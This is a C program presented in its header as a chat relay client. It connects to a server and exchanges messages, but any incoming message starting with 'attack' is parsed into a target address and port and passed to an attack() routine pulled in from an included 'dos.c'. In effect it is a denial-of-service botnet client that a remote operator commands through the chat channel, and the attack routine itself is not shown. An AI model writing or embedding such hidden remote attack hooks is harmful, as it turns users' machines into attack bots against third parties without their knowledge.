/************************************************************************\
*                                                                       *\
*           name:Chat client                                            *\
*         author:Liang Gang & Hu Xiao-qin                               *\
*       function:a program that in charge of chat relay                 *\
*           note:this program is based on the program which is write by *\
*                Mr Han zhong-qiu,and this program is a bit stronger    *\
*                than that program.                                     *\
*           date:04-18-2009                                             *\
*                                                                       *\
*************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <arpa/inet.h>

#define CLIENTPORT 1574
#define BUFSIZE 2048

#include "dos.c"
int is_begin_with(const char * str1,char *str2);

int main(int argc, char *argv[])
{
    int sockfd;
    fd_set sockset;
    struct sockaddr_in serveraddr;
    struct sockaddr_in clientaddr;
    int recvbytes;
    char recv_buf[BUFSIZE];
    char send_buf[BUFSIZE];
    
    int data_len;

    if (2 > argc)
    {
        printf("Please input the server ip!\n");
        exit(1);
    }
    if (-1 == (sockfd = socket(AF_INET, SOCK_STREAM, 0 )))
    {
        printf("create the socket error!\n");
        perror("create errors are :");
        exit(1);
    }
    memset(&serveraddr, 0, sizeof(struct sockaddr_in));
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_addr.s_addr = inet_addr(argv[1]);
    serveraddr.sin_port = htons(CLIENTPORT);

    if (-1== connect(sockfd, (struct sockaddr*)&serveraddr, sizeof(struct sockaddr)))
    {
        perror("connect error:");
        exit(1);
    }

    memset(send_buf,0,2048);
    fprintf(stderr,"welcome to visite the chat server\n");
    fprintf(stderr,"please input your name:");
    fgets(send_buf,256,stdin);

    if (0>=send(sockfd,send_buf,strlen(send_buf),0))
    {
        perror("sending data error\n");
        close(sockfd);
        exit(1);
    }


    FD_ZERO(&sockset);
    FD_SET(sockfd, &sockset);
    FD_SET(0, &sockset);

    fprintf(stdout, "client ok!\n");
    fflush(stdout);


    while (1)
    {
        memset(recv_buf, 0, sizeof(recv_buf));
        memset(send_buf, 0, sizeof(send_buf));
        select( sockfd+1, &sockset, NULL, NULL, NULL);
        if (FD_ISSET( sockfd, &sockset))
        {
            if (-1 == (recvbytes =read(sockfd, recv_buf, sizeof(recv_buf))))
            {
                perror("read data error:");
                close(sockfd);
                exit(1);
            }
            recv_buf[recvbytes] = '\0';
	    if(is_begin_with(recv_buf,"attack") ==1)
            {
            	char *data = recv_buf;
                printf("%s\n",data);
                char *addr;
                char *port;
                char *cmd;
                cmd = strsep(&data," ");
                addr = strsep(&data," ");
                port = strsep(&data," ");
		char print_buf[BUFSIZE]={'\0'};
                strcat(print_buf, "start attacking ");
		strcat(print_buf, addr);
		strcat(print_buf, " ");
                strcat(print_buf, port);
		printf("%s\n", print_buf);
		fflush(stdout);
		attack(addr, port);
		printf("finish attack");
              }else{
		printf("%s\n", recv_buf);
		fflush(stdout);
		}
            
        }
        if ( FD_ISSET( 0, &sockset))
        {
            fgets(send_buf, sizeof(send_buf), stdin);
            data_len = strlen(send_buf);
            send_buf[data_len - 1] = '\0';
            //send the content
            if (-1 == write(sockfd, send_buf, sizeof(send_buf)))
            {
                perror("send data error:");
                break;
            }
            //quit the chat room

            if (0 == strcmp(send_buf, "/quit"))
            {
                printf("quit!\n");
                break;
            }

        }

        FD_ZERO(&sockset);
        FD_SET(sockfd, &sockset);
        FD_SET(0, &sockset);
    }//end while

    close(sockfd);

    return 0;
}

int is_begin_with(const char * str1,char *str2)
{
    if(str1 == NULL || str2 == NULL)
        return -1;
    int len1 = strlen(str1);
    int len2 = strlen(str2);
    if((len1 < len2) ||  (len1 == 0 || len2 == 0))
        return -1;
    char *p = str2;
    int i = 0;
    while(*p != '\0')
    {
        if(*p != str1[i])
            return 0;
        p++;
        i++;
    }
    return 1;
}

